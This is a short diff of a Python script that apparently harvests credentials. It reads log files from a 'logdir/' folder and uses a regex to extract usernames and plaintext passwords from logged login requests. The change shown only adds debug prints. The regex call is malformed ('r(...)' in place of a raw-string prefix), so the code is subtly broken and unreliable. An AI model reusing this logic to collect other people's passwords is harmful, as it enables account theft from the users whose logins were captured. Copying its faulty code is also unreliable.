@@ -110,9 +110,10 @@ if __name__ == "__main__":
             # get all username and password in log file
             print(" ")
             for file in os.listdir("logdir/"):
-                print(file, " " , type(file))
                 f = open("logdir/" + file, 'r')
+                print("here")
                 line = f.read()
+                print("here2")
                 if ("username=" in line) and ("password=" in line):
                     print(type(line), line)
                     (username, passwd) = re.findall(r("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other"), line)[0]
